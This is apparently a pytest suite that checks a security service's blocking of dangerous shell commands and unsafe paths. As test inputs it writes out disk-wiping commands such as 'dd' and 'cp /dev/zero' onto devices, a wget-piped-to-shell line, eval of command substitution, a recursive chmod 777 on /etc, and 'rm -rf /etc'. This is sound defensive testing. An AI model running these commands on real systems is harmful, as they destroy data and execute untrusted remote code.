# ruff: noqa: E402
"""Extended tests for polaris.domain.services.security_service.

Covers additional edge cases and 0%-coverage paths not exercised by
the existing test_security_service.py suite.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

BACKEND_DIR = str(Path(__file__).resolve().parents[4])
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

from polaris.domain.exceptions import PermissionDeniedError
from polaris.domain.services.security_service import (
    DANGEROUS_PATTERNS,
    SecurityService,
    get_security_service,
    is_dangerous_command,
    reset_security_service,
)

# =============================================================================
# DANGEROUS_PATTERNS coverage
# =============================================================================


class TestDangerousPatternsCoverage:
    def test_all_patterns_are_pairs(self) -> None:
        for item in DANGEROUS_PATTERNS:
            assert isinstance(item, tuple)
            assert len(item) == 2

    def test_dd_pattern_blocks(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("dd if=/dev/zero of=/dev/hda")
        assert result.is_safe is False
        assert "Direct disk write" in result.reason

    def test_overwrite_nvme_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("> /dev/nvme0")
        assert result.is_safe is False
        assert "Overwrite NVMe" in result.reason

    def test_cp_zero_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("cp /dev/zero /dev/sda")
        assert result.is_safe is False
        assert "Zero fill" in result.reason

    def test_cp_random_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("cp /dev/random /dev/sda")
        assert result.is_safe is False
        assert "Random fill" in result.reason

    def test_eval_backticks_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("eval `id`")
        assert result.is_safe is False
        assert "Eval of backticks" in result.reason

    def test_eval_command_substitution_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("eval $(id)")
        assert result.is_safe is False
        # The broader `eval\s*\$` pattern matches before the `\$(` pattern
        assert "Eval" in result.reason

    def test_wget_pipe_sh_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("wget http://x.com | sh")
        assert result.is_safe is False
        assert "Pipe wget to shell" in result.reason

    def test_chmod_system_path_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("chmod -R 777 /etc")
        assert result.is_safe is False
        assert "Recursive permission" in result.reason

    def test_while_true_blocked(self) -> None:
        service = SecurityService(Path.cwd())
        result = service.is_command_safe("while :(); do :; done")
        assert result.is_safe is False
        assert "CPU exhaustion" in result.reason


# =============================================================================
# is_path_safe edge cases
# =============================================================================


class TestIsPathSafeExtended:
    def test_path_safe_exception_handling(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        service = SecurityService(tmp_path)
        # Force Path.resolve() to raise RuntimeError
        original_resolve = Path.resolve

        def bad_resolve(self, strict: bool = False) -> Path:
            if "trigger" in str(self):
                raise RuntimeError("boom")
            return original_resolve(self, strict=strict)

        monkeypatch.setattr(Path, "resolve", bad_resolve)
        result = service.is_path_safe("trigger")
        assert result.is_safe is False
        assert "Path validation error" in result.reason
        monkeypatch.undo()

    def test_path_safe_windows_different_drive(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        service = SecurityService(tmp_path)
        # Simulate commonpath ValueError (different drives on Windows)
        import os

        def bad_commonpath(paths: list[str]) -> str:
            raise ValueError("different drives")

        monkeypatch.setattr(os.path, "commonpath", bad_commonpath)
        result = service.is_path_safe("C:/other/file.txt")
        assert result.is_safe is False
        monkeypatch.undo()


# =============================================================================
# validate_file_operation edge cases
# =============================================================================


class TestValidateFileOperationExtended:
    def test_delete_path_object(self, tmp_path: Path) -> None:
        service = SecurityService(tmp_path)
        result = service.validate_file_operation("delete", Path("file.txt"))
        assert result.is_safe is True

    def test_write_path_object(self, tmp_path: Path) -> None:
        service = SecurityService(tmp_path)
        result = service.validate_file_operation("write", Path("file.txt"))
        assert result.is_safe is True


# =============================================================================
# sanitize_path edge cases
# =============================================================================


class TestSanitizePathExtended:
    def test_sanitize_path_object(self, tmp_path: Path) -> None:
        service = SecurityService(tmp_path)
        result = service.sanitize_path(Path("file.txt"))
        assert result == (tmp_path / "file.txt").resolve()

    def test_sanitize_tilde_path(self, tmp_path: Path) -> None:
        service = SecurityService(tmp_path)
        with pytest.raises(PermissionDeniedError):
            service.sanitize_path("~/secret.txt")


# =============================================================================
# Global functions extended
# =============================================================================


class TestGlobalFunctionsExtended:
    def test_is_dangerous_command_with_spaces(self) -> None:
        dangerous, reason = is_dangerous_command("  rm -rf /etc  ")
        assert dangerous is True
        assert reason != ""

    def test_is_dangerous_command_safe_complex(self) -> None:
        dangerous, reason = is_dangerous_command("git commit -m 'hello world'")
        assert dangerous is False
        assert reason == ""

    def test_get_security_service_different_paths_create_new(self, tmp_path: Path) -> None:
        reset_security_service()
        ws1 = tmp_path / "ws1"
        ws1.mkdir()
        ws2 = tmp_path / "ws2"
        ws2.mkdir()
        s1 = get_security_service(ws1)
        s2 = get_security_service(ws2)
        assert s1 is not s2

    def test_reset_and_recreate(self, tmp_path: Path) -> None:
        reset_security_service()
        ws = tmp_path / "ws"
        ws.mkdir()
        s1 = get_security_service(ws)
        reset_security_service()
        s2 = get_security_service(ws)
        assert s1 is not s2
